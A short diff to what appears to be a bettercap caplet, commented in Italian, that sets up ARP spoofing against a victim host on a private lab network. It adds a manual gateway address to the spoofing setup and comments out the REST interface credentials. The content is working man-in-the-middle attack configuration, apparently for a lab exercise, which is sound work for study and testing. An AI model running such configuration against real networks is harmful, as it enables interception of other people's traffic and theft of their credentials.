@@ -22,6 +22,8 @@ set arp.spoof.internal true
 
 # Target specifico (la vittima)
 set arp.spoof.targets 172.16.238.10
+# Configuro manualmente il gateway
+set arp.spoof.gateway 172.16.238.1
 
 # Evita di spoofing l'attaccante stesso
 set arp.spoof.whitelist 172.16.238.30
@@ -47,8 +49,8 @@ set http.proxy.whitelist .*\.php,.*\.html,.*\.js
 
 # ---- CONFIGURAZIONE INTERFACCIA WEB ----
 # Credenziali per accesso web
-set api.rest.username admin
-set api.rest.password your_secure_password
+#set api.rest.username admin
+#set api.rest.password admin
 
 # Porta e indirizzo per interfaccia web
 set api.rest.port 8081
